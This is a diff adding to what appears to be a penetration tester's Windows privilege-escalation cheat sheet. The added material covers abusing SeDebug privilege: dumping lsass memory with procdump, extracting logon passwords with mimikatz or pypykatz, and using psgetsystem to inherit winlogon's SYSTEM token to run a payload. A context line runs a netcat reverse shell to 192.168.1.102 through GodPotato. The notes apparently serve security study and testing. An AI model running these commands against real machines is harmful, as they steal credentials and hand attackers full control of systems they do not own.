@@ -4796,6 +4796,39 @@ OR
 <div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>GodPotato -cmd &quot;nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012&quot;
 </span></code></pre></div></p>
 <h4 id="sedebug">SeDebug</h4>
+<hr />
+<p><strong>Dumping lsass</strong></p>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</span></code></pre></div>
+or with task manager
+<img alt="" src="../../../assets/Pasted%20image%2020250719100303.png" /></p>
+<p>read with mimikatz or pypykatz</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>mimikatz # sekurlsa::minidump lsass.dmp
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>mimikatz # sekurlsa::logonpasswords
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>pypykatz lsa minidump lsass.dmp
+</span></code></pre></div>
+<p><strong>Elevating to SYSTEM</strong></p>
+<p>https://github.com/decoder-it/psgetsystem</p>
+<p>Using psgetsystem we can launch a child process that inherits the token of the parent process.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>PS C:\tools&gt; tasklist 
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Image Name                     PID Session Name        Session#    Mem Usage
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>========================= ======== ================ =========== ============
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>System Idle Process              0 Services                   0          4 K
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>System                           4 Services                   0        116 K
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>smss.exe                       340 Services                   0      1,212 K
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>csrss.exe                      444 Services                   0      4,696 K
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>wininit.exe                    548 Services                   0      5,240 K
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>csrss.exe                      556 Console                    1      5,972 K
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>winlogon.exe                   612 Console                    1     10,408 K
+</span></code></pre></div>
+<p>We can target the <code>winlogon.exe</code> service because its running as SYSTEM.</p>
+<p>We can either 1. launch cmd.exe as SYSTEM if we have GUI access or 2. execute an exe to get a reverse shell, add ourselves to a group, or anything else.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">import-module</span> <span class="p">.\</span><span class="n">psgetsys</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">ImpersonateFromParentPid</span> <span class="n">-ppid</span> <span class="n">612</span> <span class="n">-command</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">elev</span><span class="p">.</span><span class="n">exe</span>
+</span></code></pre></div>
+<p>that process will launch with the integrity of the parent. (Hopefully SYSTEM)</p>
 
 
 
